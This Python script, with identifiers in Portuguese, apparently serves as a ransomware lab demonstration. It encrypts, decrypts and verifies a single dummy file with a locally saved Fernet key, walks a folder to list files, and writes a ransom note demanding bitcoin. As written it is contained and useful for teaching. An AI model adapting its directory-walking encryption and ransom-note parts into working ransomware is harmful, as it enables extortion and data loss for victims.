import os
from cryptography.fernet import Fernet, InvalidToken

DIRETORIO = "test_files"

ARQUIVO_ORIGINAL = os.path.join(
    DIRETORIO,
    "documento_teste.txt"
)

def preparar_laboratorio():
    os.makedirs(DIRETORIO, exist_ok=True)
    if not os.path.exists(ARQUIVO_ORIGINAL):
        with open(ARQUIVO_ORIGINAL, "x", encoding="utf-8") as arquivo:
            arquivo.write("Arquivo fictício para teste.")

#1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    try:
        with open("chave.key", "xb") as chave_file:
            chave = Fernet.generate_key()
            chave_file.write(chave)

        print("Nova chave gerada e salva.")

    except FileExistsError:
        print("Chave existente preservada.")


#2. Carregar a chave salva
def carregar_chave():
    with open("chave.key", "rb") as chave_file:
       chave = chave_file.read()
    return chave


#3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    arquivo_saida = arquivo + ".encrypted"
    with open(arquivo_saida, "xb") as file:
        file.write(dados_encriptados)
    return arquivo_saida

#4. Descriptografar um arquivo
def descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)

    with open(arquivo, "rb") as file:
        dados_criptografados = file.read()
    dados_originais = f.decrypt(dados_criptografados)
    arquivo_saida = arquivo.removesuffix(".encrypted") + ".restored"
    with open(arquivo_saida, "xb") as file:
        file.write(dados_originais)

    return arquivo_saida

#5. Inventário de arquivos
def encontrar_arquivos(diretorio):
    if not os.path.isdir(diretorio):
        raise FileNotFoundError(diretorio)

    lista = []

    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            if nome == "LEIA ISSO.txt":
                continue
            if nome.endswith((".key", ".encrypted", ".restored")):
                continue
            caminho = os.path.join(raiz, nome)
            lista.append(caminho)
    return lista

#6. Mensagem de resgate
def criar_mensagem_resgate(diretorio):
    caminho_mensagem = os.path.join(
        diretorio,
        "LEIA ISSO.txt"
    )
    try:
        with open(caminho_mensagem, "x", encoding="utf-8") as f:
            f.write("Seus arquivos foram criptografados!\n")
            f.write("Envia 1 bitcoin para o endereço X e envie o comprovante!\n")
            f.write("Depois disso, enviaremos a chave para você recuperar seus dados!\n")

    except FileExistsError:
        print("Mensagem demonstrativa existente.")


#7. Execução Principal
def main():
    preparar_laboratorio()

    gerar_chave()
    chave = carregar_chave()

    arquivos = encontrar_arquivos(DIRETORIO)
    print(f"Arquivos encontrados: {len(arquivos)}")
    if os.path.exists(ARQUIVO_ORIGINAL + ".encrypted"):
        print("Arquivo de teste ja criptografado.")
        return
    
    arquivo_criptografado = criptografar_arquivo(
        ARQUIVO_ORIGINAL,
        chave
    )
    try:
        arquivo_recuperado = descriptografar_arquivo(
            arquivo_criptografado,
            chave
        )
    except InvalidToken:
        print("ERRO: chave incorreta ou dados invalidos.")
        return

    with open(ARQUIVO_ORIGINAL, "rb") as original:
        dados_original = original.read()
    with open(arquivo_recuperado, "rb") as recuperado:
        dados_recuperados = recuperado.read()    

    if dados_original == dados_recuperados:
        print("SUCESSO: arquivos identicos!")
    else:
        print("ERRO: arquivos diferentes!")

    criar_mensagem_resgate(DIRETORIO)
                        

    
if __name__ == "__main__":
    main()